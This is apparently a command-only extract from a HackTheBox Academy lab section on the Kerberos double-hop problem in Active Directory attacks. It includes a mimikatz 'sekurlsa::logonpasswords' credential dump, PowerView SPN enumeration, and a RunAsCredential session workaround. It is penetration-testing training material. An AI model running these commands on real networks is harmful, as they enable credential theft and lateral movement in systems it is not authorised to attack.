# Section 24: Kerberos "Double Hop" Problem

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1573
- Code/command blocks: 9

> Terminal output is omitted; only commands & scripts are captured.

```powershell
PS C:\Users\ben.{{DOMAIN_NB}}> Enter-PSSession -ComputerName DEV01 -Credential {{DOMAIN_NB}}\backupadm
cd 'C:\Users\Public\'
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

```powershell
tasklist /V |findstr backupadm
```

```cmd
klist
```

```powershell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.{{DOMAIN_UPPER}} -Credential {{DOMAIN_NB}}\backupadm
```

```powershell
klist
```

```powershell
Import-Module .\PowerView.ps1
get-domainuser -spn | select samaccountname
```

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential {{DOMAIN_NB}}\backupadm
```

```powershell
Enter-PSSession -ComputerName DEV01 -Credential {{DOMAIN_NB}}\backupadm -ConfigurationName  backupadmsess
klist
```

```powershell
get-domainuser -spn | select samaccountname
```